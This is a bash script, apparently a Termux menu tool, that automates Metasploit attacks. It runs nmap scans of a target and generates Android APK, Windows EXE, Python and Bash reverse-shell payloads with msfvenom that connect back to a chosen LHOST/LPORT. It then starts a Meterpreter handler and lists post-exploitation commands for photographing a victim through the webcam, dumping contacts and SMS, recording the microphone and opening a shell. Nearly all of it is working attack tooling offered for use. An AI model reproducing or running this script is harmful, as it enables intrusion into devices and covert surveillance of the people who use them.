#!/bin/bash

# ─── Color ───────────────────────────────
red='\033[1;31m'
green='\033[1;32m'
blue='\033[1;34m'
cyan='\033[1;36m'
yellow='\033[1;33m'
nc='\033[0m'

# ─── Check Dependencies ───────────────────
check_dependencies() {
    for cmd in nmap msfvenom msfconsole; do
        if ! command -v $cmd &> /dev/null; then
            echo -e "${red}❌ $cmd is not installed!${nc}"
            echo -e "${cyan}👉 Install it using:${green} pkg install unstable-repo && pkg install metasploit nmap${nc}"
            exit
        fi
    done
}

# ─── Banner ───────────────────────────────
banner() {
    clear
    echo -e "${blue}"
    echo "╔══════════════════════════════════════════════╗"
    echo "║       🔥 Metasploit Mini Pro for Termux 🔥    ║"
    echo "╠══════════════════════════════════════════════╣"
    echo "║     Made by Md Abdullah 🇧🇩 | Termux Tool     ║"
    echo "╚══════════════════════════════════════════════╝"
    echo -e "${nc}"
}

# ─── Menu ──────────────────────────────────
menu() {
    banner
    echo -e "${cyan}Select an Option:${nc}"
    echo -e "${green}1) 🔍 Vulnerability Scanner"
    echo "2) 🛠️ Exploit Info"
    echo "3) 💣 Payload Generator"
    echo "4) 🎧 Start Listener"
    echo "5) 🧠 Post-Exploitation Commands"
    echo -e "6) ❌ Exit${nc}"
    echo ""
    read -p "👉 Enter Option: " opt
    case $opt in
        1) scanner ;;
        2) exploit_info ;;
        3) payload_generator ;;
        4) listener ;;
        5) post_exploit ;;
        6) echo -e "${red}❌ Exiting...${nc}"; exit ;;
        *) echo -e "${red}Invalid option!${nc}"; sleep 1; menu ;;
    esac
}

# ─── Vulnerability Scanner ──────────────────
scanner() {
    clear
    echo -e "${yellow}💥 Vulnerability Scanner${nc}"
    read -p "🔗 Enter Target IP/Domain: " target
    if [[ -z "$target" ]]; then
        echo -e "${red}❌ Target cannot be empty!${nc}"
        sleep 1; scanner
    else
        echo -e "${green}Scanning...${nc}"
        nmap -sV -A -T4 $target
        echo -e "${cyan}✔️ Scan Completed.${nc}"
        read -p "Press Enter to return to menu..."
        menu
    fi
}

# ─── Exploit Info ───────────────────────────
exploit_info() {
    clear
    echo -e "${yellow}🛠️ Exploit Reference List${nc}"
    echo "1) Android WebView AddJavascriptInterface Exploit"
    echo "2) MS08-067 Windows SMB Remote Code Execution"
    echo "3) Apache Struts 2 Content-Type Remote Code Exec"
    echo "4) Wordpress File Upload Vulnerability"
    echo "5) Drupal SQL Injection"
    echo ""
    echo -e "${cyan}⚠️ Use Metasploit manually for real exploitation.${nc}"
    read -p "Press Enter to return to menu..."
    menu
}

# ─── Payload Generator ──────────────────────
payload_generator() {
    clear
    echo -e "${yellow}💣 Payload Generator${nc}"
    echo "1) Android APK"
    echo "2) Windows EXE"
    echo "3) Python Reverse Shell"
    echo "4) Bash Reverse Shell"
    echo ""
    read -p "👉 Select Payload Type: " type
    if [[ "$type" =~ ^[1-4]$ ]]; then
        read -p "LHOST (Your IP): " lhost
        read -p "LPORT (Your Port): " lport
        if [[ -z "$lhost" || -z "$lport" ]]; then
            echo -e "${red}❌ LHOST and LPORT cannot be empty!${nc}"
            sleep 1; payload_generator
        fi
        case $type in
            1)
                msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o payload.apk
                output="payload.apk"
                ;;
            2)
                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o payload.exe
                output="payload.exe"
                ;;
            3)
                msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw -o payload.py
                output="payload.py"
                ;;
            4)
                msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw -o payload.sh
                output="payload.sh"
                ;;
        esac
        if [[ -f "$output" ]]; then
            echo -e "${green}✔️ Payload saved as $output${nc}"
        else
            echo -e "${red}❌ Failed to generate payload. Check msfvenom and storage access.${nc}"
        fi
    else
        echo -e "${red}❌ Invalid option!${nc}"
        sleep 1; payload_generator
    fi
    read -p "Press Enter to return to menu..."
    menu
}

# ─── Listener ───────────────────────────────
listener() {
    clear
    echo -e "${yellow}🎧 Start Listener${nc}"
    echo "Payload Types:"
    echo "1) android/meterpreter/reverse_tcp"
    echo "2) windows/meterpreter/reverse_tcp"
    echo "3) cmd/unix/reverse_python"
    echo "4) cmd/unix/reverse_bash"
    echo ""
    read -p "👉 Select Payload Type (1-4): " pltype
    case $pltype in
        1) payload="android/meterpreter/reverse_tcp" ;;
        2) payload="windows/meterpreter/reverse_tcp" ;;
        3) payload="cmd/unix/reverse_python" ;;
        4) payload="cmd/unix/reverse_bash" ;;
        *) echo -e "${red}❌ Invalid option!${nc}"; sleep 1; listener ;;
    esac
    read -p "LHOST (Your IP): " lhost
    read -p "LPORT (Your Port): " lport
    if [[ -z "$lhost" || -z "$lport" ]]; then
        echo -e "${red}❌ LHOST and LPORT cannot be empty!${nc}"
        sleep 1; listener
    else
        msfconsole -q -x "use exploit/multi/handler; set payload $payload; set LHOST $lhost; set LPORT $lport; exploit"
    fi
    read -p "Press Enter to return to menu..."
    menu
}

# ─── Post-Exploitation ──────────────────────
post_exploit() {
    clear
    echo -e "${yellow}🧠 Post-Exploitation Toolkit${nc}"
    echo "1) webcam_snap       → Take photo from victim [Command: webcam_snap]"
    echo "2) dump_contacts     → Get victim contacts [Command: dump_contacts]"
    echo "3) dump_sms          → Get victim SMS [Command: dump_sms]"
    echo "4) record_mic        → Record victim mic [Command: record_mic]"
    echo "5) shell             → Get system shell [Command: shell]"
    echo ""
    echo -e "${cyan}⚠️ Run these commands inside an active Meterpreter session.${nc}"
    read -p "Press Enter to return to menu..."
    menu
}

# ─── Start Script ───────────────────────────
check_dependencies
menu
